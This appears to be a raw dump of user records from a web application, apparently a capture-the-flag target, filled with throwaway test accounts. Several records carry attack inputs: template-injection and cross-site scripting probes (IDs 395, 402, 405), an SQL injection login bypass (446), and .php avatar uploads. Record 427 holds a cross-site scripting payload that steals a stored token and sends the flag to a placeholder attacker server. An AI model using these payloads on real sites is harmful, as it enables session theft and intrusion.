+ID = 391
+{"id":391,"fullName":"toan a","username":"toan345","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 392
+{"id":392,"fullName":"qq qq","username":"qqq","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 393
+{"id":393,"fullName":"dinh tran","username":"dinhtran25","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 394
+{"id":394,"fullName":"a b","username":"abab","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 395
+{"id":395,"fullName":"{{7*7}} {{7*7}}","username":"{{7*7}}{{7*7}}","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 396
+{"id":396,"fullName":"a a","username":"admins","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 397
+{"id":397,"fullName":"Min Add","username":"AddMin","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 398
+{"id":398,"fullName":"Nguyen Cong Dung","username":"admin12","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 399
+{"id":399,"fullName":"rap uta","username":"raputa","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 400
+{"id":400,"fullName":"nguyen dang","username":"nguyenhuudang","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 401
+{"id":401,"fullName":"vh vh","username":"vh","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 402
+{"id":402,"fullName":"#jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(5397)//>\\x3e #jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(5397)//>\\x3e","username":"#jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(5397)//>\\x3e","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 403
+{"id":403,"fullName":"timmy pham","username":"gophay09","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 404
+{"id":404,"fullName":"Khang Minh","username":"Khang","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 405
+{"id":405,"fullName":"?name=abc#<img src=\"random.gif\" onerror=alert(5397)> ?name=abc#<img src=\"random.gif\" onerror=alert(5397)>","username":"?name=abc#<img src=\"random.gif\" onerror=alert(5397)>","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 406
+{"id":406,"fullName":"lam lam","username":"lam1","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 407
+{"id":407,"fullName":"Phat Nguyen Tan","username":"phatntse173285@fpt.edu.vn","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 408
+{"id":408,"fullName":"anh anh","username":"anh","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 409
+{"id":409,"fullName":"abc 123","username":"admin1222","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 410
+{"id":410,"fullName":"Phan  Quang","username":"Neroeawd","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 411
+{"id":411,"fullName":"admin admin","username":"seee123","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 412
+{"id":412,"fullName":"a aa","username":"hack","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 413
+{"id":413,"fullName":"Minh Luong","username":"hm1nh","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 414
+{"id":414,"fullName":"stutu stutu","username":"stutu","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 415
+{"id":415,"fullName":"mlem kem","username":"mlem","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760751779609.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 416
+{"id":416,"fullName":"A B","username":"A","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 417
+{"id":417,"fullName":"ds sd","username":"dsf","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 418
+{"id":418,"fullName":"hh hh","username":"nguoidung01","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 419
+{"id":419,"fullName":"john smith","username":"johnsmith12","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 420
+{"id":420,"fullName":"ưg dđ","username":"3yyyd","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 421
+{"id":421,"fullName":"aaaa aaaa","username":"apollo","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 422
+{"id":422,"fullName":"k k","username":"k","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 423
+{"id":423,"fullName":"To Huu Danh","username":"todanh","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 424
+{"id":424,"fullName":"hiep  nguyen","username":"PENTEST","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752035484.php","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 425
+{"id":425,"fullName":"heloo cdzc","username":"u1","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 426
+{"id":426,"fullName":"ff ff","username":"ff","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 427
+{"id":427,"fullName":"admin11 admin11","username":"admin111","email":"test1234@example.com","description":"New user<img src=x onerror=\"(async()=>{const t=localStorage.getItem('token');const r=await fetch('/api/token-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:t})});const j=await r.json();fetch('https://YOUR-SERVER/collect?f='+encodeURIComponent(j.flag));})();\">\n","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 428
+{"id":428,"fullName":"Hello World","username":"12341234","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 429
+{"id":429,"fullName":"Phan Vuong","username":"Phan Ngoc Vuong","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 430
+{"id":430,"fullName":"ân 123","username":"ád","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 431
+{"id":431,"fullName":"asd asdas","username":"aaaaaaaa","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 432
+{"id":432,"fullName":"ab ab","username":"abababab","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 433
+{"id":433,"fullName":"test test","username":"test@","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752006310.php","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 434
+{"id":434,"fullName":"nam phan","username":"nam","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 435
+{"id":435,"fullName":"1 1","username":"hieu2","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 436
+{"id":436,"fullName":"da ta","username":"data","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 437
+{"id":437,"fullName":"2 2","username":"duc2183","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 438
+{"id":438,"fullName":"Thi Nguyen","username":"HackerWH","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 439
+{"id":439,"fullName":"test Test","username":"testtt","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 440
+{"id":440,"fullName":"h1 h1","username":"h1","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 441
+{"id":441,"fullName":"a a","username":"nd0","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 442
+{"id":442,"fullName":". .","username":".","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 443
+{"id":443,"fullName":"0016_Nguyễn Hữu Đang huu","username":"0016_Nguyễn Hữu Đang","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 444
+{"id":444,"fullName":"xx xx","username":"xxx","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 445
+{"id":445,"fullName":"Quynh Nguyen","username":"cscv_vn_0884","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 446
+{"id":446,"fullName":"a a","username":"admin' OR '1' = '1' --","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 447
+{"id":447,"fullName":"qw qwd","username":"qwdqw","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 448
+{"id":448,"fullName":"Hacker Lord","username":"hackerlord","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 449
+{"id":449,"fullName":"nguyen van a","username":"testtest","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 450
+{"id":450,"fullName":"Rayhaan khan","username":"rayk9_n","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752158424.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 451
+{"id":451,"fullName":"z z","username":"z","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 452
+{"id":452,"fullName":"eee eee","username":"eee","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 453
+{"id":453,"fullName":"61 61","username":"61","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 454
+{"id":454,"fullName":"frez frez","username":"frezz","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 455
+{"id":455,"fullName":"khai khai","username":"khai1","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 456
+{"id":456,"fullName":"Teerapat Simmawan","username":"admin555","email":"test1234@example.com","description":"New user","avatar":"https://i.pinimg.com/1200x/d3/88/5e/d3885e4a5748dddbb9b874dc0cf6fabd.jpg","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 457
+{"id":457,"fullName":"hello world","username":"yes","email":"test1234@example.com","description":"New user","avatar":"/uploads/user_undefined_1760752082245.php","birthdate":null,"gender":null,"company":"abc"}
+
+ID = 458
